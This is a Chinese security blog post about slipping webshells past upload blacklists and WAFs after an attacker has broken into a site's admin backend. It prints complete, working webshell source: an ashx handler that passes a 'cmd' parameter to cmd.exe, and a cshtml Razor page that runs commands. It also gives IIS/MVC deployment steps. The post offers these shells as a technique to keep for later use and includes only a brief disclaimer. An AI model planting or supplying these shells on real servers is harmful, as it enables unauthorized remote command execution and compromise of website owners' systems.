> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FMZQpn9ck3bbPLUgdLDXUw)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

**所有话题标签：**

[#Web 安全](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1558250808926912513&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#漏洞复现](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1558250808859803651&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#工具使用](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1556485811410419713&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#权限提升](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559100355605544960&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

[#权限维持](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1554692262662619137&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#防护绕过](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1553424967114014720&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#内网安全](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559102220258885633&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#实战案例](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1553386251775492098&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

[#其他笔记](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559102973052567553&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)   [#资源分享](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559103254909796352&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect) [](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1559103254909796352&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect) [#MSF](https://mp.weixin.qq.com/mp/appmsgalbum?action=getalbum&album_id=1570778197200322561&__biz=Mzg4NTUwMzM1Ng==#wechat_redirect)

 |

**0x01 前言**

我们通过 SQL 注入或弱口令等方式进入网站后台并找到上传地址，但是在上传 Webshell 时发现存在黑名单限制或者某些 WAF 防护时是无法成功的。

这时可以尝试使用 ashx 和 cshtml 脚本文件来绕过上传的黑名单限制。以前有看到过很多这样的绕过案例，所以将这个技巧记录在此，便于日后查询使用！

**常见黑名单****禁止上传脚本有：**

<table><tbody><tr><td width="617" valign="top">asp、asa、cer、cdx、htr、stm；</td></tr><tr><td width="617" valign="top">php、php4、php5、phtml；</td></tr><tr><td width="617" valign="top">aspx、ashx、ascx；</td></tr><tr><td width="617" valign="top">jsp、jspx、jspf；</td></tr><tr><td width="617" valign="top">cfm、shtml；</td></tr></tbody></table>

**0x02 Ashx Webshell**

中国菜刀 Ashx 马：

https://github.com/tennc/webshell/blob/master/caidao-shell/customize.ashx

```
<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
using System.Diagnostics;
using System.IO;

public class AverageHandler : IHttpHandler
{
  /* .Net requires this to be implemented */
  public bool IsReusable
  {
    get { return true; }
  }

  /* main executing code */
  public void ProcessRequest(HttpContext ctx)
  {
    Uri url = new Uri(HttpContext.Current.Request.Url.Scheme + "://" +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);
    string command = HttpUtility.ParseQueryString(url.Query).Get("cmd");

    ctx.Response.Write("<form method='GET'>Command: <input );
    ctx.Response.Write("<hr>");
    ctx.Response.Write("<pre>");

    /* command execution and output retrieval */
    ProcessStartInfo psi = new ProcessStartInfo();
    psi.FileName = "cmd.exe";
    psi.Arguments = "/c "+command;
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    Process p = Process.Start(psi);
    StreamReader stmrdr = p.StandardOutput;
    string s = stmrdr.ReadToEnd();
    stmrdr.Close();

    ctx.Response.Write(System.Web.HttpUtility.HtmlEncode(s));
    ctx.Response.Write("</pre>");
    ctx.Response.Write("<hr>");
    ctx.Response.Write("By <a href='http://www.twitter.com/Hypn'>@Hypn</a>, for educational purposes only.");
 }
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOctYbsLOPwxwVZWOzIYnKa1u0sDggG5fj3p3lLTzJrCmvkcp7iataDxCzibY2zmohbzZLIU9dD5ktsw/640?wx_fmt=png)

Ashx Webshell 执行命令

**0x03 Cshtml Webshell**

```
@using System.CodeDom.Compiler;
@using System.Diagnostics;
@using System.Reflection;
@using System.Web.Compilation;

@functions {
  string ExecuteCommand(string command, string arguments = null)
  {
    var output = new System.Text.StringBuilder();
    var process = new Process();
    var startInfo = new ProcessStartInfo
    {
      FileName = command,
      Arguments = arguments,
      WorkingDirectory = HttpRuntime.AppDomainAppPath,
      RedirectStandardOutput = true,
      RedirectStandardError = true,
      UseShellExecute = false
    };

    process.StartInfo = startInfo;
    process.OutputDataReceived += (sender, args) => output.AppendLine(args.Data);
    process.ErrorDataReceived += (sender, args) => output.AppendLine(args.Data);
    process.Start();
    process.BeginOutputReadLine();
    process.BeginErrorReadLine();
    process.WaitForExit();

    return output.ToString();
  }
}

@{
  var cmd = ExecuteCommand("cmd.exe", "/c whoami");
}

Output of the injected command (by Niemand):
  @cmd
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOctYbsLOPwxwVZWOzIYnKa1SPRjpVcWUiarlAZoBlibSxWM981hvQ5Ol2ib2c16nRLE0H4m8rzdgTiakw/640?wx_fmt=png)

Cshtml Webshell 执行命令

**0x04 MVC4.0 环境部署**

本地测试环境为 Windows2012 IIS8.5，默认已安装有. Net FrameWork 4.0，自己下载并安装 ASP.NET MVC 4.0，将 IIS 中的 “ISAPI 和 CGI 限制” 选项的 “ASP.NET v4.0.0.30319” 设置为允许，然后在网站根目录下创建一个 web.config 配置文件即可，内容如下：

```
<configuration>
    <system.web>
        <customErrors mode="Off"/>
    </system.web>
    <appSettings>     
        <add key="webPages:Version" value="2.0"/>
    </appSettings>
</configuration>
```

**.Net FrameWork 4.0 下载地址：**  

```
https://www.microsoft.com/zh-CN/download/details.aspx?id=17851
```

**ASP.NET MVC 4.0 **下载地址**：  
**

```
https://www.microsoft.com/zh-CN/download/details.aspx?id=30683
```

**注：**如果当前网站根目下没有 web.config 配置文件，或者没有指定. NET 版本，在浏览器访问时可能就会出现以下报错信息。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOctYbsLOPwxwVZWOzIYnKa1gP5IUzxcYdXhKFClRZBn7MHJJuMaroAdK7GvFEynaZhzwPprf5Uz0g/640?wx_fmt=png)

没有 web.config 文件报错

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOctYbsLOPwxwVZWOzIYnKa1wx4pEvMK82KPIF0tsHDeIMWoNmx8P4QrKicf2cMhniapAlp6DafkWPyg/640?wx_fmt=png)

没有指定. NET 版本报错  

只需在公众号回复 “9527” 即可领取一套 HTB 靶场学习文档和视频，“1120” 领取安全参考等安全杂志 PDF 电子版，“1208” 领取一份常用高效爆破字典，还在等什么？

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfSyD5Wo2fTiaYRzt5iaWg1GJk2Cx54PBIoc0Ia3z1yIfeyfUV61mn3skB5bGP3QHicHudVjMEGhqH4A/640?wx_fmt=png)